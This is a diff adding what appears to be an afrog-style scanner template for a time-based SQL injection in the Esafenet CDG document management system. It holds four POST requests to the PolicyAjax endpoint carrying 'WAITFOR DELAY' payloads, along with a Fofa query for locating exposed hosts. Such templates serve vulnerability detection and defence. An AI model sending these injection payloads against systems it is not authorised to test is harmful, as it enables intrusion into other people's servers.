@@ -1,0 +1,40 @@
+id: esafenet-cdgserver3-policyajax-sqli
+
+info:
+  name: 亿赛通电子文档管理系统-policyajax接口SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Fofa: app="亿赛通-电子文档安全管理系统"
+  reference:
+    - https://mp.weixin.qq.com/s/K2Eaxt8wdj6chzou_OfcrQ
+  tags: esafenet,sqli
+  created: 2024/02/28
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CDGServer3/dojojs/../PolicyAjax
+      body: command=selectOption&id=-1';WAITFOR DELAY '0:0:10'--&type=JMCL
+    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+  r1:
+    request:
+      method: POST
+      path: /CDGServer3/dojojs/../PolicyAjax
+      body: command=selectOption&id=-1';WAITFOR DELAY '0:0:6'--&type=JMCL
+    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
+  r2:
+    request:
+      method: POST
+      path: /CDGServer3/dojojs/../PolicyAjax
+      body: command=selectOption&id=-1';WAITFOR DELAY '0:0:10'--&type=JMCL
+    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+  r3:
+    request:
+      method: POST
+      path: /CDGServer3/dojojs/../PolicyAjax
+      body: command=selectOption&id=-1';WAITFOR DELAY '0:0:6'--&type=JMCL
+    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
+expression: r0() && r1() && r2() && r3()
